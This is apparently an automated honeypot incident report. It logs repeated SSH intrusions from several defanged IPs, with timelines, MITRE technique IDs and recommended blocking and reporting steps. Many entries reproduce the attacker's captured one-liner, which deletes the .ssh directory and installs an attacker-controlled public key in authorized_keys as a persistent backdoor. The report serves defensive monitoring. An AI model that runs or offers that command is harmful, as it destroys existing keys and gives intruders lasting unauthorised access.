| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:45 |
| **Last Seen** | 2026-04-24 17:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:45:07` | `cowrie.session.connect` |
| `2026-04-24 17:45:07` | `cowrie.client.version` |
| `2026-04-24 17:45:07` | `cowrie.client.kex` |
| `2026-04-24 17:45:08` | `cowrie.login.success` |
| `2026-04-24 17:45:08` | `cowrie.session.params` |
| `2026-04-24 17:45:08` | `cowrie.command.input` |
| `2026-04-24 17:45:08` | `cowrie.command.failed` |
| `2026-04-24 17:45:08` | `cowrie.log.closed` |
| `2026-04-24 17:45:08` | `cowrie.session.params` |
| `2026-04-24 17:45:08` | `cowrie.command.input` |
| `2026-04-24 17:45:08` | `cowrie.session.file_download` |
| `2026-04-24 17:45:08` | `cowrie.log.closed` |
| `2026-04-24 17:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ec271ea371

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:45 |
| **Last Seen** | 2026-04-24 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:45:10` | `cowrie.session.connect` |
| `2026-04-24 17:45:10` | `cowrie.client.version` |
| `2026-04-24 17:45:10` | `cowrie.client.kex` |
| `2026-04-24 17:45:11` | `cowrie.login.success` |
| `2026-04-24 17:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f798f4fa639b

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:45 |
| **Last Seen** | 2026-04-24 17:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:45:32` | `cowrie.session.connect` |
| `2026-04-24 17:45:32` | `cowrie.client.version` |
| `2026-04-24 17:45:33` | `cowrie.client.kex` |
| `2026-04-24 17:45:33` | `cowrie.login.success` |
| `2026-04-24 17:45:33` | `cowrie.session.params` |
| `2026-04-24 17:45:33` | `cowrie.command.input` |
| `2026-04-24 17:45:33` | `cowrie.command.failed` |
| `2026-04-24 17:45:33` | `cowrie.log.closed` |
| `2026-04-24 17:45:34` | `cowrie.session.params` |
| `2026-04-24 17:45:34` | `cowrie.command.input` |
| `2026-04-24 17:45:34` | `cowrie.session.file_download` |
| `2026-04-24 17:45:34` | `cowrie.log.closed` |
| `2026-04-24 17:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ad7ac65e7d2

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:45 |
| **Last Seen** | 2026-04-24 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:45:36` | `cowrie.session.connect` |
| `2026-04-24 17:45:36` | `cowrie.client.version` |
| `2026-04-24 17:45:36` | `cowrie.client.kex` |
| `2026-04-24 17:45:36` | `cowrie.login.success` |
| `2026-04-24 17:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b73aaea2c1

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:46 |
| **Last Seen** | 2026-04-24 17:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:46:38` | `cowrie.session.connect` |
| `2026-04-24 17:46:38` | `cowrie.client.version` |
| `2026-04-24 17:46:38` | `cowrie.client.kex` |
| `2026-04-24 17:46:39` | `cowrie.login.success` |
| `2026-04-24 17:46:39` | `cowrie.session.params` |
| `2026-04-24 17:46:39` | `cowrie.command.input` |
| `2026-04-24 17:46:39` | `cowrie.command.failed` |
| `2026-04-24 17:46:39` | `cowrie.log.closed` |
| `2026-04-24 17:46:40` | `cowrie.session.params` |
| `2026-04-24 17:46:40` | `cowrie.command.input` |
| `2026-04-24 17:46:40` | `cowrie.session.file_download` |
| `2026-04-24 17:46:40` | `cowrie.log.closed` |
| `2026-04-24 17:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8763a28aebb

| Field | Detail |
|---|---|
| **Source IP** | `43.130.57[.]128` |
| **First Seen** | 2026-04-24 17:46 |
| **Last Seen** | 2026-04-24 17:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:46:42` | `cowrie.session.connect` |
| `2026-04-24 17:46:42` | `cowrie.client.version` |
| `2026-04-24 17:46:42` | `cowrie.client.kex` |
| `2026-04-24 17:46:43` | `cowrie.login.success` |
| `2026-04-24 17:46:43` | `cowrie.session.params` |
| `2026-04-24 17:46:43` | `cowrie.command.input` |
| `2026-04-24 17:46:43` | `cowrie.command.failed` |
| `2026-04-24 17:46:44` | `cowrie.log.closed` |
| `2026-04-24 17:46:44` | `cowrie.session.params` |
| `2026-04-24 17:46:44` | `cowrie.command.input` |
| `2026-04-24 17:46:44` | `cowrie.session.file_download` |
| `2026-04-24 17:46:44` | `cowrie.log.closed` |
| `2026-04-24 17:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.57[.]128` to AbuseIPDB if not already reported
- [ ] Block `43.130.57[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c9eb06c0ff

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:46 |
| **Last Seen** | 2026-04-24 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:46:42` | `cowrie.session.connect` |
| `2026-04-24 17:46:42` | `cowrie.client.version` |
| `2026-04-24 17:46:42` | `cowrie.client.kex` |
| `2026-04-24 17:46:42` | `cowrie.login.success` |
| `2026-04-24 17:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2006a6350054

| Field | Detail |
|---|---|
| **Source IP** | `43.130.57[.]128` |
| **First Seen** | 2026-04-24 17:46 |
| **Last Seen** | 2026-04-24 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:46:48` | `cowrie.session.connect` |
| `2026-04-24 17:46:48` | `cowrie.client.version` |
| `2026-04-24 17:46:48` | `cowrie.client.kex` |
| `2026-04-24 17:46:49` | `cowrie.login.success` |
| `2026-04-24 17:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.57[.]128` to AbuseIPDB if not already reported
- [ ] Block `43.130.57[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a92a007e188

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:47 |
| **Last Seen** | 2026-04-24 17:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:47:09` | `cowrie.session.connect` |
| `2026-04-24 17:47:09` | `cowrie.client.version` |
| `2026-04-24 17:47:09` | `cowrie.client.kex` |
| `2026-04-24 17:47:10` | `cowrie.login.success` |
| `2026-04-24 17:47:10` | `cowrie.session.params` |
| `2026-04-24 17:47:10` | `cowrie.command.input` |
| `2026-04-24 17:47:10` | `cowrie.command.failed` |
| `2026-04-24 17:47:10` | `cowrie.log.closed` |
| `2026-04-24 17:47:10` | `cowrie.session.params` |
| `2026-04-24 17:47:10` | `cowrie.command.input` |
| `2026-04-24 17:47:10` | `cowrie.session.file_download` |
| `2026-04-24 17:47:10` | `cowrie.log.closed` |
| `2026-04-24 17:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf6e9bc7d0a4

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:47 |
| **Last Seen** | 2026-04-24 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:47:12` | `cowrie.session.connect` |
| `2026-04-24 17:47:12` | `cowrie.client.version` |
| `2026-04-24 17:47:12` | `cowrie.client.kex` |
| `2026-04-24 17:47:13` | `cowrie.login.success` |
| `2026-04-24 17:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bcef2023e2d

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:47 |
| **Last Seen** | 2026-04-24 17:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:47:43` | `cowrie.session.connect` |
| `2026-04-24 17:47:43` | `cowrie.client.version` |
| `2026-04-24 17:47:43` | `cowrie.client.kex` |
| `2026-04-24 17:47:43` | `cowrie.login.success` |
| `2026-04-24 17:47:44` | `cowrie.session.params` |
| `2026-04-24 17:47:44` | `cowrie.command.input` |
| `2026-04-24 17:47:44` | `cowrie.command.failed` |
| `2026-04-24 17:47:44` | `cowrie.log.closed` |
| `2026-04-24 17:47:44` | `cowrie.session.params` |
| `2026-04-24 17:47:44` | `cowrie.command.input` |
| `2026-04-24 17:47:44` | `cowrie.session.file_download` |
| `2026-04-24 17:47:44` | `cowrie.log.closed` |
| `2026-04-24 17:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-500845dd9eb7

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:47 |
| **Last Seen** | 2026-04-24 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:47:46` | `cowrie.session.connect` |
| `2026-04-24 17:47:46` | `cowrie.client.version` |
| `2026-04-24 17:47:46` | `cowrie.client.kex` |
| `2026-04-24 17:47:47` | `cowrie.login.success` |
| `2026-04-24 17:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4722c5e24021

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:48 |
| **Last Seen** | 2026-04-24 17:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:48:34` | `cowrie.session.connect` |
| `2026-04-24 17:48:34` | `cowrie.client.version` |
| `2026-04-24 17:48:34` | `cowrie.client.kex` |
| `2026-04-24 17:48:34` | `cowrie.login.success` |
| `2026-04-24 17:48:35` | `cowrie.session.params` |
| `2026-04-24 17:48:35` | `cowrie.command.input` |
| `2026-04-24 17:48:35` | `cowrie.command.failed` |
| `2026-04-24 17:48:35` | `cowrie.log.closed` |
| `2026-04-24 17:48:35` | `cowrie.session.params` |
| `2026-04-24 17:48:35` | `cowrie.command.input` |
| `2026-04-24 17:48:35` | `cowrie.session.file_download` |
| `2026-04-24 17:48:35` | `cowrie.log.closed` |
| `2026-04-24 17:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30664c62b4f3

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:48 |
| **Last Seen** | 2026-04-24 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:48:37` | `cowrie.session.connect` |
| `2026-04-24 17:48:37` | `cowrie.client.version` |
| `2026-04-24 17:48:37` | `cowrie.client.kex` |
| `2026-04-24 17:48:38` | `cowrie.login.success` |
| `2026-04-24 17:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c757a4825b6

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:49 |
| **Last Seen** | 2026-04-24 17:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:49:33` | `cowrie.session.connect` |
| `2026-04-24 17:49:33` | `cowrie.client.version` |
| `2026-04-24 17:49:33` | `cowrie.client.kex` |
| `2026-04-24 17:49:33` | `cowrie.login.success` |
| `2026-04-24 17:49:33` | `cowrie.session.params` |
| `2026-04-24 17:49:33` | `cowrie.command.input` |
| `2026-04-24 17:49:33` | `cowrie.command.failed` |
| `2026-04-24 17:49:34` | `cowrie.log.closed` |
| `2026-04-24 17:49:34` | `cowrie.session.params` |
| `2026-04-24 17:49:34` | `cowrie.command.input` |
| `2026-04-24 17:49:34` | `cowrie.session.file_download` |
| `2026-04-24 17:49:34` | `cowrie.log.closed` |
| `2026-04-24 17:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3545eb94152

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:49 |
| **Last Seen** | 2026-04-24 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:49:36` | `cowrie.session.connect` |
| `2026-04-24 17:49:36` | `cowrie.client.version` |
| `2026-04-24 17:49:36` | `cowrie.client.kex` |
| `2026-04-24 17:49:36` | `cowrie.login.success` |
| `2026-04-24 17:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e5dc337bac5

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:54 |
| **Last Seen** | 2026-04-24 17:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:54:27` | `cowrie.session.connect` |
